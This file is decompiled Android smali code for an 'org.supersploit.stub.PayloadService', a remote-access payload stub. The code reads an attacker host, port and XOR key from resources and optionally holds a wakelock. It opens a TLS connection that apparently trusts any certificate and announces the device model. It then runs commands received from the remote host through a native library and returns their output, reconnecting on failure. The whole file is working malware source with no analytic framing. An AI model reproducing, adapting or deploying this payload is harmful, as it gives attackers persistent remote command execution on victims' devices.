.class public Lorg/supersploit/stub/PayloadService;
.super Landroid/app/Service;
.source "PayloadService.java"


# instance fields
.field private wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 25
    const-string v0, "payload"

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 22
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$000(Lorg/supersploit/stub/PayloadService;Ljava/lang/String;ILjava/lang/String;)V
    .locals 0

    .line 22
    invoke-direct {p0, p1, p2, p3}, Lorg/supersploit/stub/PayloadService;->connectionLoop(Ljava/lang/String;ILjava/lang/String;)V

    return-void
.end method

.method private connectionLoop(Ljava/lang/String;ILjava/lang/String;)V
    .locals 11

    .line 79
    const-string v0, "UTF-8"

    :catch_0
    :goto_0
    const/4 v1, 0x1

    :try_start_0
    new-array v1, v1, [Ljavax/net/ssl/TrustManager;

    new-instance v2, Lorg/supersploit/stub/PayloadService$2;

    invoke-direct {v2, p0}, Lorg/supersploit/stub/PayloadService$2;-><init>(Lorg/supersploit/stub/PayloadService;)V

    const/4 v3, 0x0

    aput-object v2, v1, v3

    .line 87
    const-string v2, "TLS"

    invoke-static {v2}, Ljavax/net/ssl/SSLContext;->getInstance(Ljava/lang/String;)Ljavax/net/ssl/SSLContext;

    move-result-object v2

    .line 88
    new-instance v4, Ljava/security/SecureRandom;

    invoke-direct {v4}, Ljava/security/SecureRandom;-><init>()V

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v1, v4}, Ljavax/net/ssl/SSLContext;->init([Ljavax/net/ssl/KeyManager;[Ljavax/net/ssl/TrustManager;Ljava/security/SecureRandom;)V

    .line 89
    invoke-virtual {v2}, Ljavax/net/ssl/SSLContext;->getSocketFactory()Ljavax/net/ssl/SSLSocketFactory;

    move-result-object v1

    .line 91
    invoke-virtual {v1, p1, p2}, Ljavax/net/ssl/SSLSocketFactory;->createSocket(Ljava/lang/String;I)Ljava/net/Socket;

    move-result-object v1

    check-cast v1, Ljavax/net/ssl/SSLSocket;

    .line 92
    invoke-virtual {v1}, Ljavax/net/ssl/SSLSocket;->startHandshake()V

    .line 94
    invoke-virtual {v1}, Ljavax/net/ssl/SSLSocket;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    .line 95
    invoke-virtual {v1}, Ljavax/net/ssl/SSLSocket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    .line 98
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Android Native Session: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "\n"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 99
    invoke-direct {p0, v4, v5, p3}, Lorg/supersploit/stub/PayloadService;->sendData(Ljava/io/OutputStream;Ljava/lang/String;Ljava/lang/String;)V

    :goto_1
    const/4 v5, 0x4

    .line 102
    new-array v6, v5, [B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const/4 v7, 0x0

    .line 104
    :goto_2
    const-string v8, "EOF"

    const/4 v9, -0x1

    if-ge v7, v5, :cond_1

    rsub-int/lit8 v10, v7, 0x4

    .line 105
    :try_start_1
    invoke-virtual {v2, v6, v7, v10}, Ljava/io/InputStream;->read([BII)I

    move-result v10

    if-eq v10, v9, :cond_0

    add-int/2addr v7, v10

    goto :goto_2

    .line 106
    :cond_0
    new-instance v1, Ljava/lang/Exception;

    invoke-direct {v1, v8}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    throw v1

    .line 110
    :cond_1
    invoke-static {v6}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;

    move-result-object v5

    sget-object v6, Ljava/nio/ByteOrder;->BIG_ENDIAN:Ljava/nio/ByteOrder;

    invoke-virtual {v5, v6}, Ljava/nio/ByteBuffer;->order(Ljava/nio/ByteOrder;)Ljava/nio/ByteBuffer;

    move-result-object v5

    invoke-virtual {v5}, Ljava/nio/ByteBuffer;->getInt()I

    move-result v5

    if-nez v5, :cond_2

    goto :goto_1

    .line 113
    :cond_2
    new-array v6, v5, [B

    const/4 v7, 0x0

    :goto_3
    if-ge v7, v5, :cond_4

    sub-int v10, v5, v7

    .line 116
    invoke-virtual {v2, v6, v7, v10}, Ljava/io/InputStream;->read([BII)I

    move-result v10

    if-eq v10, v9, :cond_3

    add-int/2addr v7, v10

    goto :goto_3

    .line 117
    :cond_3
    new-instance v1, Ljava/lang/Exception;

    invoke-direct {v1, v8}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    throw v1

    .line 121
    :cond_4
    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v6, v0}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    .line 122
    invoke-static {v5, v3}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v5

    .line 123
    invoke-virtual {p3, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v6

    invoke-direct {p0, v5, v6}, Lorg/supersploit/stub/PayloadService;->xor([B[B)[B

    move-result-object v5

    .line 124
    new-instance v6, Ljava/lang/String;

    invoke-direct {v6, v5, v0}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    .line 126
    const-string v6, "exit"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_5

    .line 127
    invoke-virtual {v1}, Ljavax/net/ssl/SSLSocket;->close()V

    return-void

    .line 132
    :cond_5
    invoke-virtual {p0, v5}, Lorg/supersploit/stub/PayloadService;->executeNative(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_6

    .line 133
    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-eqz v6, :cond_7

    .line 134
    :cond_6
    const-string v5, " \n"

    .line 137
    :cond_7
    invoke-direct {p0, v4, v5, p3}, Lorg/supersploit/stub/PayloadService;->sendData(Ljava/io/OutputStream;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    const-wide/16 v1, 0x2710

    .line 140
    :try_start_2
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_0
.end method

.method private sendData(Ljava/io/OutputStream;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 146
    const-string v0, "UTF-8"

    invoke-virtual {p2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p2

    invoke-virtual {p3, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p3

    invoke-direct {p0, p2, p3}, Lorg/supersploit/stub/PayloadService;->xor([B[B)[B

    move-result-object p2

    const/4 p3, 0x2

    .line 147
    invoke-static {p2, p3}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p2

    .line 148
    invoke-virtual {p2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p2

    const/4 p3, 0x4

    .line 150
    invoke-static {p3}, Ljava/nio/ByteBuffer;->allocate(I)Ljava/nio/ByteBuffer;

    move-result-object p3

    sget-object v0, Ljava/nio/ByteOrder;->BIG_ENDIAN:Ljava/nio/ByteOrder;

    invoke-virtual {p3, v0}, Ljava/nio/ByteBuffer;->order(Ljava/nio/ByteOrder;)Ljava/nio/ByteBuffer;

    move-result-object p3

    array-length v0, p2

    invoke-virtual {p3, v0}, Ljava/nio/ByteBuffer;->putInt(I)Ljava/nio/ByteBuffer;

    move-result-object p3

    invoke-virtual {p3}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object p3

    .line 151
    invoke-virtual {p1, p3}, Ljava/io/OutputStream;->write([B)V

    .line 152
    invoke-virtual {p1, p2}, Ljava/io/OutputStream;->write([B)V

    .line 153
    invoke-virtual {p1}, Ljava/io/OutputStream;->flush()V

    return-void
.end method

.method private xor([B[B)[B
    .locals 4

    .line 157
    array-length v0, p1

    new-array v0, v0, [B

    const/4 v1, 0x0

    .line 158
    :goto_0
    array-length v2, p1

    if-ge v1, v2, :cond_0

    .line 159
    aget-byte v2, p1, v1

    array-length v3, p2

    rem-int v3, v1, v3

    aget-byte v3, p2, v3

    xor-int/2addr v2, v3

    int-to-byte v2, v2

    aput-byte v2, v0, v1

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    return-object v0
.end method


# virtual methods
.method public native executeNative(Ljava/lang/String;)Ljava/lang/String;
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 7

    .line 34
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 37
    invoke-virtual {p0}, Lorg/supersploit/stub/PayloadService;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {p0}, Lorg/supersploit/stub/PayloadService;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const-string v2, "lhost"

    const-string v3, "string"

    invoke-virtual {v0, v2, v3, v1}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0, v0}, Lorg/supersploit/stub/PayloadService;->getString(I)Ljava/lang/String;

    move-result-object v0

    .line 38
    invoke-virtual {p0}, Lorg/supersploit/stub/PayloadService;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const-string v2, "lport"

    invoke-virtual {p0}, Lorg/supersploit/stub/PayloadService;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    invoke-virtual {p0, v1}, Lorg/supersploit/stub/PayloadService;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    .line 39
    invoke-virtual {p0}, Lorg/supersploit/stub/PayloadService;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const-string v4, "xor_key"

    invoke-virtual {p0}, Lorg/supersploit/stub/PayloadService;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v4, v3, v5}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    invoke-virtual {p0, v2}, Lorg/supersploit/stub/PayloadService;->getString(I)Ljava/lang/String;

    move-result-object v2

    .line 40
    invoke-virtual {p0}, Lorg/supersploit/stub/PayloadService;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "wakelock"

    invoke-virtual {p0}, Lorg/supersploit/stub/PayloadService;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v3, v6}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    invoke-virtual {p0, v3}, Lorg/supersploit/stub/PayloadService;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 42
    const-string v4, "true"

    invoke-virtual {v4, v3}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 43
    const-string v3, "power"

    invoke-virtual {p0, v3}, Lorg/supersploit/stub/PayloadService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/os/PowerManager;

    if-eqz v3, :cond_0

    const/4 v4, 0x1

    .line 45
    const-string v5, "SuperSploit::PayloadWakelock"

    invoke-virtual {v3, v4, v5}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v3

    iput-object v3, p0, Lorg/supersploit/stub/PayloadService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 46
    invoke-virtual {v3}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 50
    :cond_0
    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lorg/supersploit/stub/PayloadService$1;

    invoke-direct {v4, p0, v0, v1, v2}, Lorg/supersploit/stub/PayloadService$1;-><init>(Lorg/supersploit/stub/PayloadService;Ljava/lang/String;ILjava/lang/String;)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 55
    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public onDestroy()V
    .locals 1

    .line 70
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 71
    iget-object v0, p0, Lorg/supersploit/stub/PayloadService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 72
    iget-object v0, p0, Lorg/supersploit/stub/PayloadService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_0
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    const/4 p1, 0x1

    return p1
.end method
